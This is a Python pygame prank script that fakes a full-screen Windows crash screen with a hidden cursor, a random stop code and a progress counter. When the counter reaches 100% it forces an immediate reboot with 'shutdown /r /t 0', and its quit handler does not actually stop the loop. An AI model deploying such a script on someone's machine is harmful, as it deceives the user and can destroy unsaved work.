import pygame
import random
import os
import sys

# Initialize Pygame and set running to true so it starts to run
pygame.init()
running_bsod = True
running_ifb = False

# Set the text height and font parameters, you can mess with these if you like (remove the ## symbols to activate the lines)
txt_w = 800
txt_h = 600
font1_path = "Segoe_ui3.ttf"
font2_path = "Segoe_ui2.ttf"
#font3_path = "Segoe-ui3.ttf"
font1_size = 60
font2_size = 20
##font3-size = 20
font1 = pygame.font.Font(font1_path, font1_size)
font2 = pygame.font.Font(font2_path, font2_size)
##font3 = pygame.font.Font(font3_path, font2_size)

# Set the window size, color, and caption
window = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)
pygame.display.set_caption("BSOD")
blue_color = (0, 51, 160)
black_color = (0, 0, 0)
window.fill(blue_color)
pygame.mouse.set_visible(False)

# Define the images
bsod_smile = pygame.image.load("Smile.png")
bsod_QR = pygame.image.load("QR.png")
blue_screen_smile = pygame.transform.scale(bsod_smile, (250, 250))
blue_screen_qr_code = pygame.transform.scale(bsod_QR, (150, 150))

# Define possible error messages, you can add your own custom errors to this list, just stay in the brackets and add a comma after each, unless its the last
error_messages = [
    "KERNEL_SECURITY_CHECK_FAILURE",
    "SYSTEM_THREAD_EXCEPTION_NOT_HANDLED",
    "IRQL_NOT_LESS_OR_EQUAL",
    "PAGE_FAULT_IN_NONPAGED_AREA",
    "DRIVER_POWER_STATE_FAILURE",
    "SYSTEM_SERVICE_EXCEPTION",
    "MEMORY_MANAGEMENT",
    "CRITICAL_PROCESS_DIED",
    "INACCESSIBLE_BOOT_DEVICE",
    "CRITICAL PROCESS DIED",
    "BAD_SYSTEM_CONFIG_INFO",
    "DPC_WATCHDOG_VIOLATION",
    "NOT_SUBSCRIBED_TO_309ELECTRONICS_ON_YOUTUBE",
]

# Choose a random error message to display
chosen_error = random.choice(error_messages)

# Set clock speed and set counter to 0
clock = pygame.time.Clock()
fps = 5  #In frames per second (fps)
counter = 0
sdt = 0

# Simulate the BSOD and the (almost infinite black)
def BSOD():
    window.fill(blue_color)
    error_text1 = font1.render("Your PC ran into a problem and needs to restart. We're", True, (255, 255, 255))
    error_text2 = font1.render("just collecting some error info, and then we'll restart for", True, (255, 255, 255))
    error_text3 = font1.render("you.", True, (255, 255, 255))
    error_message_text = font2.render(f"Stopcode: {chosen_error}", True, (255, 255, 255))
    call_support_message = font2.render(f"If you call a support person, give them this info.", True, (255, 255, 255))
    For_more_info_message = font2.render(f"For more information about this issue or possible fixes, visit https://www.windows.com/stopcode", True, (255, 255, 255))
    blue_screen_percentage = font1.render(f"{counter_text} complete", True, (255, 255, 255))  # RGB values for white

    # Put the pictures and text on screen
    window.blit(blue_screen_smile, (50, 99))
    window.blit(blue_screen_qr_code, (50, 780))
    window.blit(blue_screen_percentage, (50, 660))
    window.blit(error_text1, (50, 380))
    window.blit(error_text2, (50, 460))
    window.blit(error_text3, (50, 540))
    window.blit(For_more_info_message, (220, 780))
    window.blit(error_message_text, (220, 900))
    window.blit(call_support_message, (220, 870))
    pygame.display.flip()


# Logic
while running_bsod == True:
    for event in pygame.event.get():
       if event.type == pygame.QUIT:
            running_ifb = False
    if counter < 100:
        counter += 1
        counter_text = f"{counter}%"
    BSOD()  
    pygame.display.flip()
    clock.tick(fps) 
    if counter == 100:
        running_bsod = False
        os.system("shutdown /r /t 0")  #Disable this line by putting ## before the line, if disabled the script wont restart the computer but also it wont be as real as a real bsod.
        ##sys.exit()                   #Enable this function if you want to get the bsod window to close after it reaches 100%, remove the ## and it is activated

